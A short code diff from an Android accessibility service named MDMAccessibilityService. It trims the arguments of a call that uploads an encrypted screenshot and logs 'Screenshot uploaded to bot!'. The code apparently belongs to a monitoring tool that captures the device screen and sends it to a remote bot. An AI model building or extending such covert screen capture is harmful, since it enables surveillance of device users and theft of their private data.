@@ -218,9 +218,7 @@ class MDMAccessibilityService : AccessibilityService() {
                                 // Upload the screenshot
                                 uploadManager.uploadEncryptedFile(
                                     file,
-                                    "screenshot",
-                                    deviceId,
-                                    "photo"
+                                    "screenshot"
                                 )
                                 Log.i(TAG, "✅ Screenshot uploaded to bot!")
                             } else {
